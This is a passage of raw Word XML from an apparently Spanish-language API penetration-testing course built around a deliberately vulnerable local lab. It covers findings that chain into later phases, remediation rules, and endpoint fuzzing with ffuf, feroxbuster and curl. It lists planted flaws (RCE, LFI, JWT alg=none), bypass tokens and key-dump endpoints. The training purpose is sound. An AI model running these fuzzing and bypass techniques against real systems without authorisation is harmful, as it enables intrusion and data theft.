        <w:t>FLAG-INVENT-02  -&gt; openapi.json (lista todo)</w:t>
        <w:br/>
        <w:t>FLAG-INVENT-03  -&gt; postman_collection.json (tokens hardcoded)</w:t>
        <w:br/>
        <w:t>FLAG-INVENT-04  -&gt; v3/auth/login alg=none</w:t>
        <w:br/>
        <w:t>FLAG-INVENT-05  -&gt; v3/admin/exec.php RCE</w:t>
        <w:br/>
        <w:t>FLAG-INVENT-06  -&gt; test/users.php dump</w:t>
        <w:br/>
        <w:t>FLAG-INVENT-07  -&gt; dev/dump.php query arbitraria</w:t>
        <w:br/>
        <w:t>FLAG-INVENT-08  -&gt; staging mirror sin rate limit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Como esto encadena con las siguientes fases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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Hallazgo Fase 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Habilita en Fase...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Lista de endpoints en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>openapi.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Fase 3 (fuzzing dirigido a </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/admin/*</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/internal/*</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>x-magic-headers</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>openapi.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 4 (header fuzzing)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>x-mass-assign-bug</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>x-hidden-body-params</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 4 (body param fuzzing)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">RCE en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v3/admin/exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Fase 5 - lectura de </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.env</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> real, dump de DB</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Query arbitraria en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/dev/dump.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - extraccion de internal_config</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>JWT con alg=none aceptado</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB02 escalado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Para cada version expuesta:</w:t>
        <w:br/>
        <w:t>// - Inventariarla en un registry</w:t>
        <w:br/>
        <w:t>// - Decidir status: active / deprecated / decommissioned</w:t>
        <w:br/>
        <w:t>// - Bloquear via WAF/Apache las decommissioned</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Eliminar archivos:</w:t>
        <w:br/>
        <w:t>// rm -rf api/v2/ api/v3/ api/test/ api/dev/ api/staging/</w:t>
        <w:br/>
        <w:t>// O rewrite a 404:</w:t>
        <w:br/>
        <w:t>//   &lt;LocationMatch "^/api/(v2|v3|test|dev|staging)/"&gt;</w:t>
        <w:br/>
        <w:t>//       Require all denied</w:t>
        <w:br/>
        <w:t>//   &lt;/LocationMatch&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// /api/internal/ - bloquear por IP allowlist:</w:t>
        <w:br/>
        <w:t>//   &lt;LocationMatch "^/api/internal/"&gt;</w:t>
        <w:br/>
        <w:t>//       Require ip 10.0.0.0/8</w:t>
        <w:br/>
        <w:t>//       Require ip 172.16.0.0/12</w:t>
        <w:br/>
        <w:t>//       Require ip 192.168.0.0/16</w:t>
        <w:br/>
        <w:t>//   &lt;/LocationMatch&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Swagger publico: NUNCA exponer x-internal-servers ni x-undocumented-endpoints</w:t>
        <w:br/>
        <w:t>// Mover openapi.json a un repo privado o servir solo desde un host interno</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Fase 3 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 13 - Endpoint Discovery (Directory &amp; Path Fuzzing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Fase de la Metodologia: 3 - ENDPOINT FUZZING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Aplicar la tercera fase del pentest de API: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>descubrir endpoints individuales dentro de cada version y namespace</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/admin/*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/internal/*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/users/*</w:t>
      </w:r>
      <w:r>
        <w:t>, etc.). Esta fase usa las pistas de Fase 1 (RECON) y Fase 2 (INVENTORY) para hacer fuzzing dirigido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">A diferencia de Fase 2 (que descubre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>versiones</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), Fase 3 descubre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rutas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dentro de una version conocida.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Hallazgos esperados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint nuevo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Auth</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Que rompe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/admin/backup.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?token=backup_static_2024</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> o magic flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Dump SQL completo de la DB</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/admin/logs.php?file=...</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>magic flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LFI clasica + lee logs</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/admin/exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Admin-Token: admin_dev_bypass_v1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> o </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Cookie: internal_user=admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/internal/health</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>XFF interna o magic flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Filtra DB_PASS, JWT_SECRET, todos los tokens</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/wallets/private-keys.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>magic flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Dump de TODAS las private keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/users/export.csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?key=export_2024</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> o magic flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">CSV con </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>password_plain</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>password_hash</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/.git-rev</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>sin auth</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Filtra commit hash, branch y remote URL interna</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Tecnicas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 - Path bruteforcing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:t>TOK=$(curl -s -X POST $TARGET/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -d '{"username":"carlos","password":"carlos2024"}' | jq -r .token)</w:t>
        <w:br/>
        <w:br/>
        <w:t># Brute de paths bajo /api/v1/admin/</w:t>
        <w:br/>
        <w:t>ffuf -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u $TARGET/api/v1/admin/FUZZ.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200,401,403 -t 30 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOK"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Brute con extensiones (csv, json, xml)</w:t>
        <w:br/>
        <w:t>ffuf -w SecLists/Discovery/Web-Content/api/objects.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u $TARGET/api/v1/users/FUZZ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -e .csv,.json,.xml,.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200,401 -t 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 - Verb fuzzing (HTTP method)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Probar todos los metodos en un endpoint conocido</w:t>
        <w:br/>
        <w:t>for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $V $TARGET/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -H "Authorization: Bearer $TOK")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "$V -&gt; $STATUS"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 - Recursivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># feroxbuster baja recursivamente - util para namespaces</w:t>
        <w:br/>
        <w:t>feroxbuster -u $TARGET/api/v1/ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">            -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">            -x php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">            -t 30 -d 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 - Combinar con pistas de Fase 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Las notas internas (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>notes.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TODO.md</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>listan endpoints concretos</w:t>
      </w:r>
      <w:r>
        <w:t>. Sin Fase 1 el alumno tarda horas; con Fase 1 son segundos:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Probar cada endpoint listado en notes.txt y TODO.md</w:t>
        <w:br/>
        <w:t>for E in admin/backup.php admin/exec.php admin/logs.php internal/health \</w:t>
        <w:br/>
        <w:t xml:space="preserve">         wallets/private-keys.php users/export.csv .git-rev; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "=== /api/v1/$E ==="</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl -s -o /dev/null -w "%{http_code}\n" $TARGET/api/v1/$E</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Wordlists</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SecLists/Discovery/Web-Content/api/api-endpoints.txt    (12k entradas)</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/api/objects.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/api/actions.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/raft-medium-words.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/quickhits.txt</w:t>
        <w:br/>
        <w:t>assetnote/wordlists/automated/php.txt</w:t>
        <w:br/>
        <w:t>wordlists/cryptovulnx-endpoints.txt    (incluido)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
